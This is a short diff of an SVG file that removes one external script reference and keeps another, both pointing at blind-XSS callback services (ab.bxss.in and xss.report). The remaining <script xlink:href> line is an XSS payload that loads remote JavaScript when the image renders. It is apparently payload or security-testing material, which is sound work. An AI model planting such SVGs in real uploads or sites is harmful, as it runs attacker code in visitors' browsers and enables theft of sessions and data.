@@ -9,6 +9,5 @@
        xmlns:xlink="http://www.w3.org/1999/xlink"
        xml:space="preserve">
     <!-- Script linked from the outside-->
-    <script xlink:href="https://ab.bxss.in" />
     <script xlink:href="https://xss.report/c/ab1" />
   </svg>
